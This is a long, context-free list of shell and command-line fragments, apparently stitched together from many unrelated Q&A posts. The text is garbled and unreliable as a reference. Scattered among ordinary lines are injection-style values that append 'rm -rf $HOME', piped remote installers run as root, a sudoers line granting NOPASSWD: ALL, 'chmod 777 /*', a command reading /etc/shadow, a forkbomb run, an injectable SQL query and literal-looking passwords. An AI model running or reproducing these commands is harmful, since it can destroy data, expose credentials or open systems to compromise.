print v, cnts[v]
sudo crontab -e
mv -f b.sh a.sh && sh a.sh && exit
trap a.sh EXIT
/#include   *"/
data <- read.table(pipe(paste("(head -n1 && tail -n",skip,")<",name,"| ./myscript.sh",rand)), header = TRUE, colClasses = classes,sep=",")
awk -F "," 'NF != 18' ./a.csv
data <- read.table(pipe(paste("(head -n1 && tail -n",skip," | head " as.integer(skip)-1")<",name,"| ./myscript.sh",rand)), header = TRUE, colClasses = classes,sep=",")
g++ -MM
echo "<command> <parms>" | netcat host 5555
ls ~/
foo="ls ~/"
foo='ls ~/'
'date +"%A, %B %-d, %Y"'
alias today='date +"%A, %B %-d, %Y"'
cd /media/Owncloud
-bash: cd: /media/Owncloud/: Permission denied
sudo chmod 755 /media/Owncloud
sudo chown -R www-data:www-data /media/Owncloud
sudo -i
ls -l
'datadirectory' => '/srv/data',
head -1
tail -n+2
column -to' '
column -to' '
xmllint --help | grep "\-\-xpath"
xmllint --xpath "//policy/btw[text()='true']/../policynumber" xmllint-xpath.file
sed 's#hello#bye#g'
$(somecommand someargs)
NR>{print ""}
ls **
ls *.txt
ls *{01..04}.{txt,csv}
ls *01.txt *01.csv *02.txt *02.csv *03.txt *03.csv *04.txt *04.csv
['Tests/**/*.js', '!Tests/UI/**']
stat -f "%N" <pattern>
sort -nrk8 my_file.txt | head -20
composer create-project -s dev sylius/sylius
export COMPOSER_PROCESS_TIMEOUT=6000   ( defaults to 300 )
$cfg['ExecTimeLimit'] = 0;
enum CEC::cec_logical_address
name=(value1 ... valuen)
declare -a
declare -A
host unix.stackexchange.com
cat hostname.txt
cat $@
Today is a good day
Today is a friday
/home/User Name/tarfolder
cat file.xml
tee -a
man bash
if ... then ... elif ... fi
var=$(git status)
su pi -c "crontab -l | { cat; echo \"0 4 * * * pkill -f awesomeFile.py ; python /home/user/python/awesomeFile.py &\"; } | crontab -"
./path to unpermitted/ptmx
-D skip
echo ${myarr1[@]}
source $HOME/.env-dump.txt
ssh $1 -t 'bash -l'
foobaristhehelloworld <-> XYZ with abc
grep -f
> file4.txt
paste 1 2 3|awk -v OFS='\t' '{print...}'
|column -t
shopt -s nullglob
[^ ]*
ID, Name and Ontology_term
foo j
\ | / -
column -t
OK: |'\System\Processor Queue Length_value'
'CPU Queue'
touch oli-test
timeout 3 cat
string map
crontab -l
crontab -e
crontab -r
for directory in Ex[0-9] Ex[0-9][0-9] Ex[0-9][0-9][0-9]
man bash
cp file1\ with\ escaped\ spaces file2\ with\ escaped\ spaces
[^\\] *
${fl%%[^\\] *}
tail -n+2
sed -E 's/ +/ /'
cut -d' ' -f2-
sed 's_ */// *_\n_'
od -t u1 filename
od -t u2 filename
while read
ls | tr "\n" "\t"
ls -lh whatever-arguments-follow
[: too many arguments
brew install fish --HEAD
Girl, Sara
alias pathname="/home/Dommol/test/next"
cd pathname
-bash: cd: pathname: No such file or directory
alias pathname="cd /home/Dommol/test/next"
man comm
[open $filename "w"]
open  "w"]
find . -name "*.png" -exec mv "{}" ./"$1"-dir \;
test.sh 1
bash test.sh
APP=/apps echo "cd $APP && pwd"
sed '/Python-[\d+.]+tgz/'
grep -oP
while read
Not xml
All Good
sed -i.bak 's/,//' file
tail -1
tail -1
sed -n
sed: Missing newline at end of file tmp8.
shopt -s nullglob
use strict;
use warnings;
close $fh;
top -b -p $myPID
!echo $home
sed -e 'one thing' -e 'another thing'
grep -P
bash -vc
grep .
| grep .
NO USER IDENTIFIED
select concat(FIRST,LAST) from users where concat(FIRST,LAST) like '%${username}%;'
find -exec
-mtime +10
-mtime +10
1/18/2015 5:59 PM
man find
sudo -u gammu -g gammu /var/spool/gammu/forward.sh
ls -l /etc/gammu-smsdrc /var/spool/gammu/ /usr/bin/gammu-smsd*
ps -fe | grep gammu
$ sudo visudo
gammu ALL=(ALL) NOPASSWD: ALL
service gammu-smsd restart
sudo gammu-smsd-inject TEXT my_tel_num -text "Hello world!"
$(date -d "$d" +%Y%m%d)
20 aug 2020
date -d "$dateIteration" '+%s'
-F: -v OFS=":" '{print "Name",$1;print "Occ..",$2; print ...}'
% scriptname.sh filename
pnm2jpg thisfile.pnm
sh -c
sh -c
-type f
-iname "*.java"
-exec awk
END{print FILENAME":"a}
tmux list-sessions
dos2unix your_file_name.sh
grep ${linenumber}
sed -n "2p"
isatty(stdout) == false
Connection reset by peer
Operation timed out
awk -F
17 Jan 10:19PM
awk -F' - ' '{ for(i=1;i<=NF;i++){ split($i,x," "); printf("%s %s %s;%s;%s\n",substr(x[3],length(x[3])-1), x[4],x[5],substr(x[2],0,length(x[2])),substr(x[3],0,length(x[3])-1))} }' test
-F' - '
split($i,x," ");
printf("%s %s %s;%s;%s\n"
./script "echo hello ;"
echo hello ;
hello ; sleep 3
./script "echo hello &&"
./script "echo \"*\";"
export -f say_hello_and_execute
./script say_hello_and_execute
chmod +x say_hello_and_execute
./script ./say_hello_and_execute
ls -1
chmod -R g+w .
mirror --no-umask
ulimit -u 30
timeout 10s docker run -u 3000 ... forkbomb
killall -KILL -u 3000
[[ ${TABLE_ID} -eq "" ]]
man test
usage: ./my_script.sh arg_matey.html
usage: ./my_script.sh [-x] marks_the_spot.py
usage: ./my_script.sh [-p | -i | -r | -a | -t | -e] walk_the_plank.txt
[Poodle 12345]
git stash -p
git status
git diff
git add
git diff [branchname/commit]
git diff HEAD
git diff master
TAB dynamic-complete-history
head -n1000 > filename
> ${LOG}
s/_(.)/ \U$1/g
bash -c "command"
$(basename "$1")
source ~/.profile
sudo chmod +x script.sh
.tif format
Ubuntu 14.04, Imagemagick 6.7.7
{a[$1]=$2; next}
for (i in a)
if ($1 ~ i)
print $0, a[i]
-f 2-
-f 2-3
man cut
awk -F '[.=]' '{print $2,$3,$4}' OFS=.
sort | uniq -c
man bash
man 3 regex
man 3 regex
man 7 regex
[ \t]
[ \t\n\r\f\v]
b=(${adse// / })
unset "b[0]"
help read
-d ''
-a b
git push
truncate -s $(($(stat -c '%s' foo.txt)-1)) foo.txt
> >
> >
> >
> >()
> >
> >
> >()
| ()
ps -ef
pargs <PID>
pargs <PID>
kill -9 <PID>
echo "c zju_vpn" > /var/run/xl2tpd/l2tp-control
sleep 3
route add default ppp0
sleep 3
sleep 10
ext_parse txt log
chmod +x banana
ant -version
Apache Ant(TM) version 1.9.3 compiled on April 8 2014
./main.py "$f"
echo hello
NameError: name 'reader' is not defined
while loop
while loop
[[ $checkClient != *"$tempStr"* ]];
/raspivid/ && !/color=auto/
pid=$(pgrep raspivid)
pgrep [t]eleport
cp mongodb-osx-x86_64-2.6.7/bin/* /usr/local/bin/
export PATH=$HOME/mongodb/bin:$PATH
command mongo not found
iconv -f utf8 -t latin1
grep -v " "
2015-01-01 08
rm -R some_pattern
dsdfh 985*
sed -n '/\/\/-BeginBlock-\/\//I,/\/\/-/p' ~/.marks
grep -Eizoa "\/\/-BeginBlock-\/\/" ~/.marks
for (i=1;i<=NF;i++)sum+=$i
print "mean=" sum / NF
'avalom media system'
cmd = '/usr/bin/mediainfo "/var/avalon/dropbox/Nabiullin_SciERes_1.flv" --Output=XML'
cmd = 'head "/var/avalon/dropbox/Лекции_для_молодых_ученых/Nabiullin_SciERes_1.flv"'
for (i=1;i<=NF;i++){sum+=$i;ssq+=$i**2}
print "Std Dev=" (ssq/NF-(sum/NF)**2)**0.5
-v new="$NewNumber"
/Parameter1/ && NR==1
sub(/Parameter1="[[:alnum:]_]*/, "Parameter1=\""new)
bin/solr -i
-bash: cannot create temp file for here-document: No space left on device
df -h
grep -f
grep -f patterns datafile
[ ]
[ asd = "$qwe" ]
test "asd" "=" "$qwe"
sudo apt-get install npm
curl -L https://npmjs.com/install.sh | sh
sudo curl -L https://npmjs.com/install.sh | sudo sh
bash -c
jobs -l
ps | grep pterm
ps / $!
YYYY MM DD HH MM SS
$(date +%s)
subprocess.Popen(["/bin/bash", "-c", "echo", "..."]
tail --lines=10000
ls -a
ls --block-size='M'
grep -P '\t<title>'
shift 2
help shift
git status
git status --porcelain
git edit
vim -O $(git status -s | awk '{print $2}')
cp -r --backup=numbered .wh..wh./* real_directory_name/
$ push "Some message"
$ push Some message
git add
> /dev/null
> startup.log
echo -n
iso.*= STRING: "
=STRING: "
\( \)
iso.*= STRING: "
> /dev/null 2>&1 &
exec(BASE.'/../shellfile.sh '.$arg1.' '.$arg2.' '.$arg3.' > /dev/null 2>&1 &');
VAR1=$(php -q $BASE/processingfile.php $FOLDER/temp.txt)
BASE.'/../shellfile.sh '.$arg1.' '.$arg2.' '.$arg3.' > /dev/null 2>&1 &'
X-Powered-By: PHP/5.X.XX
sort -z
0000001438warlaugh 世界
0000001432231hahaha lol
source 'build/envsetup.sh'
apt-get install dos2unix
find . -type f -exec dos2unix -s -k -o {} \;
catch syscall
python ~/programs/MySoftware/src/main.py
mysoftware='python ~/programs/MySoftware/src/main.py'
apt-get install google-chrome
-group ichtys
cat /etc/shells
echo $SHELL
source ~/.zshrc
alias ..='cd ../'
alias ..=‘cd ../‘
echo $SHELL
`vim ~/.bash_profile`
bash -c
< /dev/null
[^ ]
's/^ *[^ ]\+ \+[^ ]\+ \+[^ ]\+ *//'
git log
git pull
git push
git pull
fatal: protocol error: bad line length character
Error parsing parameter '--launch-specification': Invalid JSON:
${CMD01[@]} > $logFile
echo "$CMD01"
java -version
test -d
foo; rm -rf $HOME
directory name
ipcalc -b 192.168.0.0/23
echo $msg
echo -n $msg
ls job_[0-9]{2,}.sh
postfix is running
* postfix is running
/usr/sbin/service postfix status
* postfix is running
set -x
set -e
set -u
sed -e 's/65535/N\/A/g' -e 's/[][},]//g' | awk '/foo/ {print $1,$NF,$(NF-1)}'
printf ...
seq $a $b
man bash
read -p
-i text
sbt clean compile stage
heroic run bash
bash ./execute.sh
bash ./execute.sh
kill $ppid
kill %1
kill -- -$ppid
kill: (-30847) - No such process
pkill -P $ppid
-v v
v=$(echo "scale=2;6+$i*0.02"|bc)
ls | cut -c 5-
grep -P
ls *
ls * | grep "abc\|def\|ghi"
ls * | grep "abc\|def\|ghi" | zgrep -i "ERROR" *
-exec grep
vim [match]
./openinvim.sh myfile.js
a=escaped   $1
env | grep foo=
foo=bar env | grep foo=
yes | command
bar baz
hello & world
printf %b
s/+/ /g
eval "$cmd"
:+ --
/^2/,EOF {print $2}
{if ($1==3) exit}
f {print $2+0}'
bin/mule debug
echo "haha" | at 20:30
at -l
wc -l
mylines somefile 19
rename $file ${file}_done
nohup sh -c 'while ps -p $0 > /dev/null; do sleep 10; done && mv $1 $1_done' $curpid $file &>> $pidfile &
-a file
mv *
cp *
1.pdf 2.pdf 3.pdf
set -x
gawk -v n=$OCCURENCE "/$OLD/$EXTRA{gsub(\"$OLD\",\"$NEW\")}1" $FILE_TO_AWK
gawk -v n=- "/$OLD/{gsub(\"$OLD\",\"$NEW\")}1" $FILE_TO_AWK
gawk -v n=- "/ReturnCode=\\\"500\\\"/{gsub(\"ReturnCode=\\\"500\\\"\",\"500\")}1" fichier.txt
-v OLD="$OLD" -vNEW="$NEW"
./tempcontroller_rum1.sh: 17: [: Illegal number: 25.10000038147
gcc -Wall -o unlink_it unlink_it.c
cp source.csv destination.csv
cat source.csv > destination.txt
brace expansion
brace expansion
$( [ $files -gt 1 ] && echo "s" || echo "")
-eq 2
od -bc nameofyourscript
grep foo | awk { print $1 }
awk '/foo/ { print $1 }'
foo && success || failure
dpkg -l
dpkg-query -f '${Version}\n' -W 'libc6'
ls -1 .
cd $DIRECTORY
cd $CURRENT_DIRECTORY
echo "$FILES"
echo "${FILES[@]}"
echo $FILES
echo vclist_2d_*.txt
echo vclist_2d_*.txt
SOMEVAR=$(echo vclist_2d_*.txt)
for file in $SOMEVAR
for [i in $range]
ys(i)=word("$yes",i), xs=word("$xes",i)
plot for [i=1:3] '$fil' u xs(i):ys(i) w l
[pair in "$cols"]
pgrep -f "instance"
mysqldump -uroot -ppassword -h localhost client > clientname.com.sql
/opt/bitnami/mysql/bin/mysqldump -u[user] -p[pass] dbname > [file]
execvp(argh[0], argv);
execvp(argv[0], argv)
./arguments ls -l
execvp(argv[1], argv);
cannot access ls: No such file or directory
./arguments ls -l
execvp("./arguments", {"./arguments", "ls", "-l"})
execvp("ls", {"ls", "-l"})
/bin/bash: eval: No such file or directory
which nodejs
python myscript.py
mkdir -pv
mkdir -v
mkdir -p a/b/c
mkdir -v d
mkdir: created directory 'd'
mkdir -pv e/f/g
mkdir --verbose h
illegal option -- -
mkdir -v
echo -e
[{u'hostid': u'10158'}]
find -name 'pattern1' -or -name 'pattern2'
exec echo
-exec echo {} \;
xargs -0
cat /path/to/files/*
s3cat '/bucket/path/to/files/*'
aws s3 cp
$ aws s3 cp s3://mybucket/stream.txt -
sudo pip install s3streamcat
npm install grunt-cli
./sizeof int double
sizeof(double) != 8
char foo[sizeof(MyType)]
aws redshift delete-cluster
for FILE in *XXXXXXXXXXXXXXXXXXX.mp3; do echo $(echo ${FILE} | sed -E 's/X{19}//'); done
for FILE in *XXXXXXXXXXXXXXXXXXX.mp3; do mv ${FILE} $(echo ${FILE} | sed -E 's/X{19}//'); done
cat -n | sort -rn | cut -f2-
-j 8
parallel -j 25
git pull
cd /home/rails/
bundle install
ERROR: Interrupted by user
ulimit -c unlimited
--ulimit core=-1  --privileged
command not found
. ~/.bashrc
git ls-files -m !(app)
shopt -s extglob
shopt -s extglob
grep -v
java -version
java -h
java --help
1 2
"1 2"
1 2
"1 2"
"1 2"
read -r
grep -v
stat file.ext -c %y
stat -t %s -f %m $FILE
%!"`' ()
man find
grep -oP
jq -r
history | grep forever
awk -F \; -f foo.awk filename
newline ("\n")
ps ... | grep
-A 4
grunt: command not found
cat -n
head -100
File name too long
-exec cp -t
-bash: -exec: command not found
THE BROTHER OF DAPHNE
YATES, DORNFORD
Book Title
find . -name 'Part*' -delete
find . -name 'Chapter*' -delete
find . -name 'Section*' -delete
find . -name 'Book*' -delete
find . -type d -empty -delete
awk -v
2 4 7 8 13 15 17 22 28 30 33 36 40 43
5 15 30 35 60 70 80 105 135 ...
awk '{for(i=1;i<=NF;i++){$i=1+$i}}END{print $0}' <<< $bb
./output/dir 1/
./src/dir 1/foo.markdown
ls -al
ls '2>&1' '>/dev/null'
redirect='; rm -rf $HOME'
manchu 55
manchu 55
manchu 55
x; p
x; p; q
readlink -f
index[FNR] = counter
awk -f foo.awk indexfile datafile
-F'( |,|:)+'
print $6,$7",",$8,"hours,",$9,"minutes."
s/^[^,]*up *//
s/, *[[:digit:]]* users.*//
s/([[:digit:]]+):0?([[:digit:]]+)/\1 hours, \2 minutes/'
hh hours, mm minutes
uptime -p | cut -d " " -f2-
uptime -p
cat /proc/uptime
e command
:a; /}/! {N;b a}
N; b a
b a
kill $!
echo <that output>
printf %s\\n {0..99}
-I %
-P $(nproc)
flac %
-I %
flac foo.wav
sym1 -> /usr/local/bin
sym2 -> /usr/local
readlink -e
(( ... ))
$(ls | wc -l)
(($(ls | wc -l) - n))
touch DIFF_TIME.TXT
sudo bash
&& [ -f "$0"/other_file ]
ntp engine ready
grep -q ntp engine ready
grep -q "ntp engine ready"
(( ))
inventory file
*\| *
*+/- *
wc -c
wc -c
while read
[[ ... ]]
${line% *}
wc -c
bash read-default.sh
set -o vi
export $PS4="\$LINENO> "
crontab -e
sudo crontab -e -u backupuser
> inputFile
do_check_user() { test $(whoami) = root; }
1>/dev/null 2>&1
stdout to /dev/null
if test "$?" != "0"
/usr/bin/env  python
function appendOnce { .. }
"date +%y/%m/d-%H:M"
tar -vczf /tmp/my.tar.gz /tmp/aaa/123 /tmp/bbb/222
tar -zxvf my.tar.gz
tr '/' '.'
ls | wc -l
bash --verbose
cannot execute binary file
cannot execute binary file
-c 'program ...'
command not found
-c './program ...'
chmod +x login.sh
ssh: Could not resolve hostname
awk '...'
awk '{print $4}'
FS=" {3,4}"
man bash
FS=" "
sh -c
git pull
git pull
git pull
ps aux | grep nohup
kill 'PID'
.. preliminary work .. && (webserver & test)
apt-get install screen
wait $!
wait $!
unzip test.zip
need PK compat. v5.1 (can do v4.6)
$ 7z x test.zip
sudo apt-get install p7zip-full
7z x datafile.zip -aoa -p$3CR37
p7zip-full/focal 16.02+dfsg-7build1 amd64
$ sudo apt install p7zip-full
7z --help
7z x test.zip -p****
route -n
root$ ifconfig
root$ route -n
root$ top
sh -x restart_server.sh
git clone git://git.savannah.gnu.org/bash.git
help mapfiles
shopt -s extglob
[[ ... ]]
[[ ... ]]
chmod +x awkscript
./awkscript datafile
cat datafile | ./awkscript
sed -E
sed -r
First Last1 Last2
source ./your_script.sh
. ./your_script.sh
type read
help read
man bash
delete array
whois -h whois.radb.net -- '-i origin AS15169' | grep ^route: | sed 's/.* //'
"abc "
echo "abc " | sed "s/ /d/"
echo "abc " | sed "s/./d/4"
/usr/bin/env python
python settings.py
chmod +x settings.py
uname -m
myScript newFileName
myScript file
ls -a | grep ".qmail-" | grep -v "mail" | grep ".mail" > t ; echo $?
ls -a
grep ".qmail-"
ls -a | grep ".qmail-" | grep -v "mail" | grep ".mail" > t
echo $?
ls -a | grep ".qmail-" | grep -v "mail" | grep ".mail" > t
man bash
`defaults write com.apple.finder _FXShowPosixPathInTitle -bool true`
$ ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
read -rsp $'Press spacebar to continue...\n' -d $' '
#include <stdlib.h>
system("<Command to pass to system>");
bash -c ...
HELO localhost
mkdir -m 777
sudo chmod 777 /android-tools/*
sudo chmod 777 /*
"root cat /etc/shadow"
id -u
sed --help
Foo bar
[arbitrary name](address)
array=(userA userB userC)
cmd1; cmd2; cmd3
cmd1 ; cmd2 | cmd3
{cmd1; cmd2;} | cmd3
cmd1; {cmd2 | cmd3;}
{cmd1; cmd2;  {cmd3; cmd4;}; }
{cmd1; cmd2   ;  }
vagrant up
vagrant ssh
vagrant up
vagrant up && vagrant ssh -- -t 'cd /vagrant/rails_tutorial/sample_app; /bin/bash'
vagrant ssh --
<last command> ; /bin/bash
sed -r 's/\(^.*[^a-z\r\n].*$\)//g' wordlist.txt
sed -r 's/^.*[^a-z\r\n].*$//g' wordlist.txt
sed -r 's/^.*[^a-z].*$//g' wordlist.txt
sed -r '/^.*[^a-z].*$/d' wordlist.txt
bash openvpn-install.sh 1 12356
bash openvpn-install.sh -1 -12356
$printf("\0 abc)
wget --timestamp https://example.com/my.file
stat -c %y
stat -f %m
stat -c %y
sed -n 's/`\w\+`/\U&/gp'
export $yest
set -xvu
set -xvu
tr -d '"' <file >newfile
xev -id windowid | grep FocusIn
(date +"%T.%N")
echo "$PS1"
while read
!$1{s++; next}
{if (s) print s; s=0}
END {if (s) print s}
awk '{print length}'
|| ((${#u[@]}))
say @F+0
say scalar @F
man uniq
awk '!$2 {print $1}'
MY_RESULTS="$(curl -i -H "Accept: application/json" -X GET http://localhost/test/store/widget/123)"
( "$line" )
sudo /usr/local/mysql/bin/mysqld_safe&
echo ""
grep "^[ 0-9][0]9...
wc -l
git push live master
tail -f
cd ../../directory
chmod +x /etc/rc.local
echo "$(sudo iptables -n -L -v --line-numbers)" | egrep "^[0-9]"
split($5, mdy, "/")
mdy[3]>=1900{print $2}
mysqldump -u USERNAME -pQP)u3V69S( DATABASE_NAME > backup.sql
-bash: syntax error near unexpected token ')'
[ -e $FILENAME ]
[ -e ]
[ -n -e ]
shopt -s nullglob
OUTPUT="$(ls -la)"
OUTPUT="$(ls -la)"
dpkg -s
:set fileformat=unix
"bad interpreter no such file or directory"
$ sh log.sh
${x/ [^ ]/}
" [^ ]"
set -x
agbc efg
[^\ ]*
\ ?
chmod +x banana
[ -f xxxx ]
[ -e xxxx ]
if [ -a xxxx ]
shopt -s nullglob
BEGIN {FS=OFS="\t"}
n=split($NF, a, ",")
for (i=1;i<=n;i++) s+=a[i]; $NF=s; s=0
for (i in a)
if [ $(git diff --name-only HEAD^..HEAD path/ ) ]
--dummy --audit_sessiones --user_count --detailed_user_count --parfile
COMPREPLY=( "${files[@]##*/}" )
COMPREPLY=( $(compgen -f ${cur}) )
-o default
opts="ls *"; if ... fi
complete -F _tracker -o default tracker
-o default
. + 1
name=foo bar
foo $bar
foo $bar
2.45, 3.56, 54,64
ie>   ./update.sh newvalue
41 17 * * * cd /var/log/crmpicco-logs/; grep -E "error|Warning|Error|Notice|Fatal" $(find . -mtime 0 -type f) 2>&1 | mail -s "Errors/Warnings from Logs" info@ayrshireminis.com
41 17 * * * cd /var/log/crmpicco-logs/; s=$(find . -mtime 0 -exec grep -E "error|Warning|Error|Notice|Fatal" {} +); [[ -n "$s" ]] && echo "$s" | mail -s "Errors/Warnings from Logs" info@ayrshireminis.com
grep -E
man mail
select * from
if [ -f ... ]
|sort -t~ -n -k2
(1, "lolz")
(1, "lolz")
(1, "not lolz")
(2, lolz)
$yno= Y* or y*
nohup rm -Rf /somefolder_old &
mv /somefolder /somefolder_old
file -b
file -b
grep -E
ls * | grep -E  'alice|bar|bob|foo'
grep -E
set -x
grep -E 'o{2,3}' reg_file2
>= 3
--subnet-ids "subnet-c123456" "subnet-b123456" "subnet-a123456"
$(aws --profile myProfile --region myRegion rds create-db-subnet-group --db-subnet-group-name ${!1} --db-subnet-group-description ${!1} --subnet-ids ${MySubnetA} ${MySubnetB} ${MySubnetC} --tags Key=Name,Value=${!1})
$(aws --profile myProfile --region myRegion rds create-db-subnet-group --db-subnet-group-name ${!1} --db-subnet-group-description ${!1} --subnet-ids "$MySubnetA" "$MySubnetB" "$MySubnetC" --tags Key=Name,Value=${!1})
--date='1 day'
[[ ... ]]
your_file | sed "s/\result=([0-9.]\+\)/\1/"
set -x
cat -n
-j 1
-v 1
subprocess.check_call(..., shell=True)
sed -i "/$HOST/ s/.*/$IP\t$HOST/g" /etc/hosts
Description [23-01, Nr, 2015,4/5]
/ x23
java -version
sh script
sudo sh cleanup.sh
rm -rf
rm -rf ./some_directory
-mindepth 1
rm -r
echo $CACHE
find -print0
xargs -0
echo $?
set -e
set -e
echo $?
set -e
git cvsimport
() {
sh build.sh
which ember
which ember
echo "$TEXTPARAM" > file
echo "some $$$more" > file
echo "some \$\$\$more" > file
echo 'some $$$more' > file
echo $TEXTPARAM > file
"a b"
a b
a b
a" "
strace -e execve
mkdir -v
grep -q
grep -q
tail -f <filename>
set -e
for ... in
chmod +x banana
TEXT=$(cat "$1")
bash --posix
busybox sh
Bad string
s/.\{IndexOfCharInLine\}/& /;
epiphany --new-tab www.google.de > /dev/null 2>&1 $
grep | awk
-F '\t'
./sendmail.sh "my@email.com" "Email Subject" "Email body"
echo "email body" | mail -s "email subject" email@any.com
echo "email body" |./sendmail.sh "my@email.com" "Email Subject"
Bash 4.3.33
PYTHON = python
$(shell which python 3)
which python3
$(shell type -P python3)
type -P
command -v
set -e
$i = '3:'
cut -c 4-7
cut -c 4-7 <value-of-$NAME>
if ...; then
shell script
convert('foo.gb', 'bar.faa')
ls -l
ls -l
ls -la
man ls
typeset -n
declare -n
echo $Output
[[ ]]
[ ]
su myscriptuser
service myscript start
Git 1.9.4.msysgit.2
git pull
cd $REPO_DIR && git pull origin $branch_name
"C:/Program Files (x86)/Git/bin/bash.exe": git: No such file or directory
man seq
seq 1 4
seq $a $b
casperjs test.js
bash: casperjs: command not found
npm install casperjs
bash -c "sed -i 's# libcrypto.a##;s# libssl.a##' Makefile"
eval $line
grep '\n.*' sms.txt
f && /./{print;f=0}
END{print longest}
kill -HUP
$1>0 || $2>0 ||$3>=10 {print "Kill"}
kill -HUP
sudo killall -9 apache2
apachectl start
apachectl stop
chmod a+x webapp
git commit -am 'PSR-2
error: failed to push some refs to ..
&& git commit ...
chmod +x php-cs-fixer
grep: Invalid range end
Yes it matches the content
the variable doesn't match the content
"my sms content"
5 digits
3 digits
wget http://www.xx.de/bla/foo.html
cat file.ext | awk <something with $foo and $bar> | command > /var/tmp/reports/r.html
other users
while read
ls -l
paste -d: <([awk] dates) records
Fri Jul 15:a
case ${ $MONTH } in
case ${MONTH} in
ls | escape quotes | xargs rm
mv $file ${file//\\/\/}
grep -o . <<< "$einput"
< <(...)
printf '%s' "${!input}"
chmod +x banana
NameError: name 'profile' is not defined
$ ./check <script>
if ! <cmd> ...
python ... && grep ...
__name__ == '__main__'
"base "
lockfile -r0 /path/to/lock/file.lck
for DIR in $(find ...); do "something"; done
-e 's/.../.../g'
E.g. When performing loops to edit files/dirs, using globb characters, pipes, logicals, short hand notation (i.e. ``) and last but not least applying functions for purposes which they should not be used.
. common.h
function xxx {..}
xxx() {..}
sed -i
ps ax | awk '/usr/ {print $5}'
echo "$(ps ax | awk '/usr/ {print $5}')"
printf $0
$cmd1 >>$2;
x += 1
i = Box(j.unbox())
x[i++] = --z + (t += 2) * u
x[i.postincrement()].reset( ... )
git log --stat
Update Shell Profile.command
python get-pip.py
python -m pip install ShopifyAPI
python testshop
Python 2.7.9 (v2.7.9:648dcafa7e5f, Dec 10 2014, 10:10:46)
/Library/Frameworks/Python.framework/Versions/Current/bin/python2.7 testshop
python testshop
bash ./start.sh
bash start.sh
help mapfile
which source
which: no source in (/usr/local/sbin:usr/local/bin:usr/bin)
bash -c
-maxdepth 1
cat myfiles_*
cat > fifo
cat fifo | nc -v localhost 3000
cat | nc
grep -E
grep -E
-d date-string
hg diff <filename>
hg status
hg status
hg diff
hg diff
hg status -mn0
xargs -0 hg diff
hg diff
hg diff
md5sum < file
md5sum file
-F" "
" "
make test
echo "$path1";
nohup bash -c
sudo crontab -e
0 0,2,4,6,8,10,12,14,16,18,20,22 * * * /home/lightbe/swanky_script.sh
wget -m
Syntax Error: Unexpected token ILLEGAL
flock 200
echo "Hello World (no java)" > /Users/josh/Desktop/test-output.txt
chmod +x test
java -jar HelloWorld.jar > /Users/josh/Desktop/java-output.txt
Hello World
chmod +x helloworld
Hello World
LSOpenURLsWithRole() failed with error -10810 for the file /Users/josh/Desktop/helloworld/helloworld.app
for file in **; do
dos2unix <"$file"
cat "$file"
git push origin master
Enter passphrase for /cygdrive/c/Users/mynameis/.ssh/id_rsa:
eval ssh-agent -s
grep -c
fastboot wait-for-device
adb wait-for-device
RECC=$(adb devices | sed -n '2p' | grep -c 'recovery')
adb devices
fastboot devices
adb devices
./test.sh skipmenu
gnome-terminal -x ./test.sh skipmenu
. ~/.bashrc
c="";delete d;delete e
split($2, b, /;/)
for (i in b)c=c";"(a[b[i]]?a[b[i]]:b[i])
split(substr(c,2),d,/;/); for(i in d)e[d[i]]=1
for (i in e)c=c";"i
print $1,substr(c,2)
-exec rm {} \;
bash shell
lines 3,4,5,6,7,8
it works
it doesn't work
require 'rake/phony'
declare -r -f functionName
ls -lrt
file file
su the_other_user
dig +short
for file in *.txt
ssh myuser@somecrazydomain.com
ssh $SSHCRAZY
ssh $SSHC
-o bashdefault
complete -p ssh
ssh crazy
# nagios: -epn
head -50
return 1
|| return
set -e
set -e
set -e
set -e
|| return
cut -c 8
wc -l $f | cut -c 8
cut -c 8
wc -l
-n 2
2>> logfile
crontab -l
crontab -e
NR%4==2 {}
heroku login
heroku login -e email@email.com -p qwerty
heroku login -f ./ssh_key
filter is on but the phone number doesn't match
if else
~/Library/Application Support
echo $cleanPath
$col["Views"] != 0
echo -ne '\e[9;1t'
echo -ne '\e[9;0t'
var=$(ls -1)
echo "$var"
echo $var
man bash
man bash
uniq --help
sort -u
(( arithmetic contexts ))
myCracker == myCombo
--post_tags="these are tags"
wp post
wp post term
sudo stop test_server
sudo chown -R posture /opt/data
sudo start test_server
any character
sequence of non-space characters
[^ ]*
optional space
[^ ]*
 *
shopt -s expand_aliases
sort -u
sort | uniq
grep -c
sort -u
-aux --noheader
[[ -f "$f" ]]
[[ "$f" =~ regex ]]
echo if [[ $result_check -eq 0 ]]
if [[ "x$result_check" = x0 ]]
if [[ "0$result_check" -eq 0 ]]
[[ $undefined_variable -eq 0 ]]
type [[
INSERT ... WHERE NOT EXISTS
-mindepth 1
-maxdepth 1
-printf x
wc -c
man ls
list 1M
sed 's/ \(\w*$\)/\1/'
sed 's/\w* \(\w*$\)/\1/'
_t('123', 'pcs.', '', $userLang)  . $data['ticker'] . ' (' . $data['security_name'] . ')
set +o history
3>&2 2>&1 1>&3
bash -s
Processing: Foo Bar Baz
Processing: Foo
set -e
set -e
ls <some special redirection> echo
ls > echo
bjobs -u username01 | grep normal | awk '{print $1}'
a=$(cat a)
echo "$a"
go b
~/project/entry beta another folder name
rm "$f~"
#SBATCH -A 1234
#SBATCH -t 2-00:00
#SBATCH -n 24
module add xxx
module add gaussian
system("#SBATCH whatever");
module add
use Env::Modulecmd { load => 'foo/1.0' };
module add
system ('module add xxx; srun resp.com')
use Env::Modulecmd { load => 'foo/1.0' };
<(cut -d'|' -f2 filename.txt)
chmod 755 program.py
man read
/[0-9 ]/ s/  */, /g
;/[0-9 ]/ {s/  */, /g; s/$/,/;}
npm install
$ npm install --save-exact express
$npm init
$npm install
flags to my program
Feb 17 19:22:00  :: ada0 Temperature Celsius =
* * * * * sh /path/to/HDDtemps.sh
for f in "$@"
for f in *.mp4; do
for f in "$1"/*.mp4; do
for f in "${1:-.}"/*.mp4; do
getent passwd | cut -f 5 -d: | cut -f -d' '
grep -wFf namefile
wc -l
echo "[$var1]"
$CMD | sed -e 's/find/replace/g';
is a command
var=`some command`
var=$(some command)
img src="//stats.domains.com/piwik.php?idsite=44
< <(cat
< <(cat file)
cat file | while ...
count=`expr $count + 1`
n=`tail -1 numbers`
echo 0 > numbers
awk '{ i=$0 } END { print 1+i }' numbers
[[ -d "/tmp/${0//\//_}" ]]
mkdir "/tmp/${0//\//_}"
then ... exit 1
trap 'rmdir "/tmp/${0//\//_}"' EXIT
curl | bash
[[ string =~ regex ]]
read -p <prompt>
for loop
cmd="sed s/b/\ / exp"
xargs kill -9
ps -ft
ps -o pid,tty,comm
do something ...
